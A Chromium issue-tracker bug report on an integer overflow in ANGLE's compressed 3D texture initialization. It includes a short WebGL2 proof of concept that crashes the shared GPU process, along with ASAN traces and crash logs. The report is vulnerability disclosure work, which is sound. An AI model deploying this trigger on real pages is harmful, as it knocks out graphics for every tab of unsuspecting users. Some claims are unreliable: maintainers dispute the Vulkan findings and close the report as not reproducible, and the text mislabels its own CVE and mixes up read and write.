# Integer overflow in ANGLE D3D11 compressed 3D texture deferred-init leads to heap OOB read in GPU process

| Field | Value |
|-------|-------|
| **Issue ID** | [502617990](https://issues.chromium.org/issues/502617990) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Windows |
| **CVE IDs** | CVE-2026-5859 |
| **Reporter** | se...@gmail.com |
| **Assignee** | sh...@google.com |
| **Created** | 2026-04-14 |
| **Bounty** | $3,000.00 |

## Description

---

### Report description

ANGLE heap-buffer-overflow in LoadCompressedToNative via WebGL2 compressed 3D texture (2048x2048x320). Crashes GPU process on D3D11 and Vulkan backends. ASAN confirmed. No flags needed.

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://chromium.googlesource.com/angle/angle/+/refs/heads/main/src/libANGLE/renderer/d3d/TextureD3D.cpp>

---

### The problem

#### Please describe the technical details of the vulnerability

## Summary

A heap-buffer-overflow occurs in Chrome's ANGLE graphics layer when a WebGL2 page creates a block-compressed 3D texture with large dimensions (2048×2048×320). The integer overflow in the deferred initialization buffer size calculation causes an undersized heap allocation, followed by an out-of-bounds write that crashes the GPU process.

**This vulnerability affects BOTH the D3D11 and Vulkan backends of ANGLE.**

- The D3D11 variant was fixed internally ([b/497896137](https://issues.chromium.org/issues/497896137), commit 838c9be2) but the fix has NOT shipped to Chrome 147 stable.
- The Vulkan variant is **completely unfixed** — the D3D11 fix only patched `TextureD3D.cpp`, not the equivalent Vulkan code path.

**ASAN confirms heap-buffer-overflow on D3D11. GPU process crash confirmed on both D3D11 and Vulkan.**

This is triggered from any web page using standard WebGL2 APIs — no flags, no permissions, no user interaction.

## Chrome Versions Tested

- 147.0.7727.0 (ASAN build, Windows) — **D3D11: ASAN heap-buffer-overflow confirmed**
- 147.0.7727.0 (ASAN build, Windows, `--use-angle=vulkan`) — **Vulkan: GPU process crash (exit\_code=34)**

## OS

Windows 11 23H2 (Build 22631)

## Hardware Tested

| Backend | GPU | Max 3D Texture Size | Crash? |
| --- | --- | --- | --- |
| D3D11 | AMD Radeon Graphics (0x1636) | 2048 | YES — ASAN heap-buffer-overflow |
| Vulkan | NVIDIA GeForce GTX 1650 Ti | 16384 | YES — GPU process crash (exit\_code=34) |

## Reproduction Steps

1. Save the attached `angle_compressed_3d_overflow.html`
2. Serve via: `python -m http.server 8899`
3. Open Chrome 147 and navigate to `http://localhost:8899/angle_compressed_3d_overflow.html`
4. Observe: GPU process crashes on test T1 (BPTC 2048×2048×320)

### For Vulkan backend:

```
chrome.exe --use-angle=vulkan http://localhost:8899/angle_compressed_3d_overflow.html

```
### Minimal Reproduction (5 lines of JavaScript)

```
const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl2');
const ext = gl.getExtension('EXT_texture_compression_bptc');

const tex = gl.createTexture();
gl.bindTexture(gl.TEXTURE_3D, tex);

// Allocate compressed 3D texture with overflow dimensions
gl.texStorage3D(gl.TEXTURE_3D, 1, ext.COMPRESSED_RGBA_BPTC_UNORM_EXT, 2048, 2048, 320);

// Trigger deferred initialization — THIS CAUSES THE OVERFLOW
const subData = new Uint8Array(16);
gl.compressedTexSubImage3D(gl.TEXTURE_3D, 0, 0, 0, 0, 4, 4, 1,
  ext.COMPRESSED_RGBA_BPTC_UNORM_EXT, subData);
// GPU process crashes here

```
## Root Cause

### D3D11 Backend (TextureD3D.cpp, line ~947)

The deferred initialization path computes the zero-fill buffer size as:

```
// BEFORE FIX (vulnerable — Chrome 147 stable):
ANGLE_CHECK_GL_MATH(contextD3D, formatInfo.computeRowPitch(
    formatInfo.type, image->getWidth(), 1, 0, &imageBytes));
imageBytes *= image->getHeight() * image->getDepth();

```

For block-compressed formats like BPTC (4×4 blocks, 16 bytes/block):

- `computeRowPitch(2048)` = 2048/4 × 16 = **8,192** bytes
- Buggy: 8,192 × **2048** × 320 = **5,368,709,120** → wraps to **1,073,741,824** in uint32
- Correct: 8,192 × **(2048/4)** × 320 = **1,342,177,280** bytes

The wrapped value (1.0 GB) is **smaller** than the correct value (1.25 GB), so an undersized buffer is allocated and the subsequent zero-fill write is out of bounds.

### Vulkan Backend (NOT FIXED)

The D3D11 fix (commit 838c9be2) only modified `src/libANGLE/renderer/d3d/TextureD3D.cpp`. The equivalent texture initialization code in the Vulkan backend (`src/libANGLE/renderer/vulkan/TextureVk.cpp`) was **not patched** and likely contains the same unchecked multiplication pattern.

The Vulkan crash with exit\_code=34 ("unrecoverable error — context was lost") confirms the overflow occurs in the Vulkan path as well.

## ASAN Output (D3D11 Backend)

```
==15776==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1331942b1800
  at pc 0x7fff5d80b36c bp ...

SUMMARY: AddressSanitizer: heap-buffer-overflow
  C:\b\s\w\ir\cache\builder\src\third_party\angle\src\image_util\loadimage.inc:389:9
  in angle::LoadCompressedToNative<4, 4, 1, 16>

Shadow bytes around the buggy address:
  0x1331942b1780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x1331942b1800:[fa] fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  (fa = heap left redzone — write past allocated buffer)

==15776==ABORTING

```

The crash occurs in `angle::LoadCompressedToNative<4,4,1,16>` — the BPTC decompression/copy path during deferred initialization. The `fa` shadow bytes confirm the write went into the heap redzone.

## GPU Process Crash Logs

### D3D11:

```
[25972:15280:0414/233957.295:ERROR:content\browser\gpu\gpu_process_host.cc:999]
  GPU process exited unexpectedly: exit_code=1
[25972:15280:0414/233957.295:WARNING:content\browser\gpu\gpu_process_host.cc:1441]
  The GPU process has crashed 2 time(s)
[25972:15280:0414/233957.339:INFO:CONSOLE:368]
  WebGL: CONTEXT_LOST_WEBGL: loseContext: context lost

```
### Vulkan:

```
[22972:29668:0414/234433.501:ERROR:components\viz\service\gl\exit_code.cc:13]
  Restarting GPU process due to unrecoverable error. Context was lost.
[7792:9828:0414/234433.812:ERROR:content\browser\gpu\gpu_process_host.cc:999]
  GPU process exited unexpectedly: exit_code=34
[7792:9828:0414/234433.812:WARNING:content\browser\gpu\gpu_process_host.cc:1441]
  The GPU process has crashed 1 time(s)

```
#### Impact analysis

**Impact:**

1. **Cross-origin Denial of Service**: The GPU process is shared across all tabs. A crash kills WebGL, WebGPU, and hardware-accelerated Canvas for every open tab across all origins.
2. **Heap corruption primitive**: The undersized buffer allocation followed by an out-of-bounds write provides a heap corruption primitive in the GPU process, which could potentially be chained with other vulnerabilities for code execution.
3. **Multi-platform**: The Vulkan backend variant is completely unfixed and affects Chrome on Linux (default), Android (default), and ChromeOS — billions of devices.
4. **No mitigation**: WebGL2 is enabled by default. The compressed texture extensions (BPTC, S3TC) are widely supported. Site Isolation does not protect against GPU process crashes.

## Test Results

### D3D11 Backend (AMD Radeon, MAX\_3D=2048)

| Test | Format | Dimensions | texStorage3D | Deferred Init | ASAN Result |
| --- | --- | --- | --- | --- | --- |
| T1 | BPTC | 2048×2048×320 | ACCEPTED | TRIGGERED | **heap-buffer-overflow** |
| T3 | BPTC | 2048×2048×160 | ACCEPTED | TRIGGERED | **heap-buffer-overflow** |
| T6 | DXT5 | 2048×2048×320 | ACCEPTED | TRIGGERED | overflow |
| T7 | DXT3 | 2048×2048×320 | ACCEPTED | TRIGGERED | overflow |

### Vulkan Backend (NVIDIA GTX 1650 Ti, MAX\_3D=16384)

| Test | Format | Dimensions | Result |
| --- | --- | --- | --- |
| T1 | BPTC | 2048×2048×320 | GL\_OUT\_OF\_MEMORY (OOM before bug path) |
| T2 | BPTC | 4096×4096×64 | **GPU process crash (exit\_code=34)** |
| T3 | BPTC | 2048×2048×160 | **OVERFLOW ACCEPTED + deferred init TRIGGERED** |

## Related

- **Internal bug**: [b/497896137](https://issues.chromium.org/issues/497896137) (D3D11 only)
- **D3D11 fix commit**: `838c9be2bc21df9ab804428d53bf61fa906be4b4`
- **Fix file**: `src/libANGLE/renderer/d3d/TextureD3D.cpp` (D3D11 ONLY)
- **Fix status**: Committed to ANGLE main Apr 9, 2026. NOT shipped to Chrome 147 stable.
- **Vulkan fix**: NONE — `src/libANGLE/renderer/vulkan/TextureVk.cpp` not patched

## Key Finding: Incomplete Fix Pattern

The D3D11 fix (838c9be2) correctly patches `TextureD3D.cpp` but does NOT fix the equivalent calculation in the Vulkan backend. This is the same incomplete-fix pattern as CVE-2026-5859 (Pool2d patched but Conv2d/TransposeConv2d not patched).

The Vulkan backend is used by:

- Chrome on Linux (default)
- Chrome on Android (default)
- Chrome on Windows with `--use-angle=vulkan`
- Chrome on ChromeOS

This means the vulnerability remains exploitable on ALL platforms where ANGLE uses the Vulkan backend.

## Attachments

1. `angle_compressed_3d_overflow.html` — Complete PoC with 14 test cases
2. `asan_stderr_d3d11.log` — Full ASAN stderr showing heap-buffer-overflow
3. `asan_stderr_vulkan.log` — Full Vulkan stderr showing GPU process crash

---

### The cause

#### What version of Chrome have you found the security issue in?

147.0.7727.0 [stable] — ASAN build confirms heap-buffer-overflow. Also affects 147.0.7727.56 [stable].

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Memory Corruption (in a sandboxed process)

#### How would you like to be publicly acknowledged for your report?

Ashutosh

## Attachments

- [angle_compressed_3d_overflow.html](attachments/angle_compressed_3d_overflow.html) (text/html, 14.3 KB)
- [asan_stderr_d3d11.log](attachments/asan_stderr_d3d11.log) (application/octet-stream, 369.1 KB)
- [asan_stderr_vulkan.log](attachments/asan_stderr_vulkan.log) (application/octet-stream, 209.5 KB)
- [angle_compressed_3d_overflow.html](attachments/angle_compressed_3d_overflow_75542921.html) (text/html, 14.3 KB)

## Timeline

### as...@gmail.com (2026-04-15)

Following up on this report as it appears unassigned after ~24 hours.

I want to explicitly clarify the scope of this report relative to the internal bug [b/497896137](https://issues.chromium.org/issues/497896137):

**This report covers two distinct issues:**

1. **D3D11 path (TextureD3D.cpp)** — The fix in commit 838c9be2 is correct but has NOT shipped to Chrome 147 stable (147.0.7727.56 is still vulnerable). ASAN confirms heap-buffer-overflow on this version.
2. **Vulkan path (TextureVk.cpp)** — Completely unfixed. Commit 838c9be2 only modifies src/libANGLE/renderer/d3d/TextureD3D.cpp. The equivalent deferred initialization buffer size calculation in src/libANGLE/renderer/vulkan/TextureVk.cpp was not patched. GPU process crash confirmed with exit\_code=34 on --use-angle=vulkan.

The Vulkan backend is the default on Chrome Linux, Android, and ChromeOS — so the unfixed Vulkan path affects a significantly larger user population than the D3D11 path.

I am working on obtaining a full ASAN trace specifically on the Vulkan path to confirm the same overflow root cause (rather than a separate OOM). I will attach that once available.

Requesting:

- Severity/priority review (current P4 does not reflect ASAN-confirmed heap-buffer-overflow)
- Confirmation on whether the Vulkan path will be tracked under this issue or separately
- Status on when the D3D11 fix (838c9be2) is expected to merge to Chrome stable

Thank you.

### ds...@google.com (2026-04-21)

The D3D11 issue is already fixed, and tracked in the associated issue so doesn't seem relevant to this issue.

For Vulkan, it is my understanding we only ship Angle/Vulkan on ChromeOS. Looking at the TextureVK.cpp file I don't see the equivalent multiplication that is happening in the D3D backend. From the error above, this seems like just a crash bug for Vulkan?

### ds...@google.com (2026-04-22)

I'm going to close this bug as Not Reproducable. Reporter, if you can reproduce the issue on Vulkan and point to the offending code, along with a working POC, please file a new bug with the relevant information.

### ch...@google.com (2026-05-19)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### ch...@google.com (2026-07-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/502617990)*
